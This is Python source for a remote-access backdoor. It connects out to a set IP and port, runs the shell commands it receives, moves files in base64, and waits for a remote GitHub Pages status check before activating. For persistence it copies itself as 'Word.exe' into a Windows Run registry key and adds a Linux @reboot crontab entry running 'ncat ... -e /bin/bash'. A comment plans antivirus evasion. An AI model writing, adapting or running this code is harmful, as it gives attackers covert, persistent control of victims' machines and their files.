#!/usr/bin/env python3
from ast import Pass
from pydoc import locate
from re import T
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
from webbrowser import get
import requests

IP = "localhost".encode('utf-8')  # change this
PORT = 4445  # change this (Integer Only)


class MotherFucker():
    def __init__(self, ip, port):
        self.persistence()    # Uncomment for windows
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def persistence(self):
        # Adds it self to the Windows registery and launches when the machine restarts 
        if sys.platform == "win32" or sys.platform == "win64":
            location = os.environ["appdata"] + "\\Word.exe"
            shutil(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d ''' + location + '"', shell=True)
        elif sys.platform == 'linux':
            subprocess.call(f'(crontab -l ; echo "@reboot sleep 200 && ncat {IP} {PORT} -e /bin/bash")|crontab 2> /dev/null ', shell=True)
        elif sys.platform == "darwin":
            #TODO: mak for OS X cause why not ....
            pass

    def json_send(self, data):
        # Outputs commands in a json format and sends it to the server
        json_data = json.dumps(data).encode('utf-8')
        self.connection.send(json_data)

    def json_recv(self):
        # Recives commands form client in a json format
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_dir(self, path):
        # Changes Working directory with "$ cd" command
        os.chdir(path)
        return "Changed dir to %s" % path

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                decoded_file = base64.b64decode(content)
                file.write(decoded_file)
                return "Downloaded [%s] Successfully ." % path
        except Exception as e:
            print("[-] Error during file download. \n %s" % (e))

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                encoded_file = base64.b64encode(file.read())
                return encoded_file
        except Exception as e:
            print("[-] Error during file upload. \n %s" % (e))

    def execute_system_command(self, command):
        # used check_output instead of call or run , sends the result of command back and we can see it in Client
        try:
            return subprocess.getoutput(command)
        except Exception as e:
            pass

    def run(self):
        while True:
            # gets the cmd
            rcvd_cmd = self.json_recv()
            try:
                #TODO:add auto remove program
                # closes the connection and exit the program
                if rcvd_cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()
                # cd function
                elif rcvd_cmd[0] == "cd" and len(rcvd_cmd) > 1:
                    cmd_rslt = self.change_working_dir(rcvd_cmd[1])
                # send over files
                elif rcvd_cmd[0] == "download":
                    cmd_rslt = self.read_file(rcvd_cmd[1])
                # downloads files
                elif rcvd_cmd[0] == "upload":
                    cmd_rslt = self.write_file(rcvd_cmd[1], rcvd_cmd[2])
                # custom cmd exec
                else:
                    cmd_rslt = self.execute_system_command(rcvd_cmd)
            except Exception as e:
                cmd_rslt = "[-] Error During Command Execution.\n {}".format(e)
            self.json_send(cmd_rslt)


def get_status():
    s = requests.get('https://poggerpussy.github.io').text
    #status = re.sub(r"<.*?>",'', s)
    if s == "true":
        return True
    return False


#TODO: AV-Evasion Confirmation
while True:
    try:
        if get_status():
            jja213415 = MotherFucker(IP, PORT)
            jja213415.run()
    except Exception as e:
        print(e)
        continue
